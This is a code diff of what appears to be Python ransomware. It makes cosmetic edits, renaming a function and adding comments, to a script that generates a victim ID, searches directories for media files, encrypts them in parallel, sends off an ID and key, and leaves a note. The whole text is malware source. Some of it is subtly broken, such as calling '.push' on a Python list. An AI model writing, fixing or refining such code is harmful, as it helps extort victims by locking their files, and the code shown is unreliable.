@@ -33,7 +33,7 @@ else:
 	except:
 		pass
 
-
+# Function to generate our client ID
 def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
 	global ID
 	ID = ''.join(random.choice(chars) for _ in range(size))
@@ -91,7 +91,7 @@ def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
 def single_arg_encrypt_file(in_filename):
     encrypt_file(key, in_filename)
 
-def selectfiles():
+def select_files():
     
     ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
            ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
@@ -106,6 +106,7 @@ def selectfiles():
             if file.endswith(tuple(ext)):
                 files_to_enc.push(os.path.join(root, file))
 
+    # Parallelize execution of encryption function over four subprocesses
     pool = Pool(processes=4)
     pool.map(single_arg_encrypt_file, files_to_enc)
 				
@@ -152,7 +153,7 @@ if __name__=="__main__":
 	send_ID_Key()
 	
 	try:
-		selectfiles()
+		select_files()
 		note()
 	except Exception as e:
 		pass
